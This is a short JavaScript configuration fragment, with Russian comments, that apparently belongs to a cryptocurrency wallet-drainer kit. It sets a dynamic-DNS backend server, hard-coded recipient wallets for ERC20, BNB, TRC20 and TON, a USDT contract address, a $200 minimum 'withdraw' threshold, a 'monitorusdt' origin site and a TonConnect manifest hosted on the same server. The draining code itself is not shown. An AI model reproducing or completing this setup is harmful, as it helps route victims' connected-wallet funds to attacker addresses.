...
let server = "systemapi.duckdns.org"; //заменить на адресс сервера
let projectId = "7c8719d7f91854df0c6f5ebe83a416c8";
let contractAddressUSDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Замените на адрес контракта USDT
let contractAddress = "TPJFFR3B4nsjnavGr5bM9N3ahjRoXRHWij"; //trc20 wallet
const recipient = "0xCbA2A16Af924211e28995912ac25c5E6412ea752"; //erc20 wallet
const recipientBNB = "0xCbA2A16Af924211e28995912ac25c5E6412ea752"; //bnb20 wallet
const recipientTON = "UQA4f_C7-g5JT6g_cz05z1yN37GmWTWRdzG6LMt4fuM8V80M";
let min_withdraw = "200000000"; //200$
let url_origin = "https://monitorusdt.com/";
...
const tonConnectUI = new TonConnectUI({
  manifestUrl: "https://systemapi.duckdns.org/manifest.json",
});
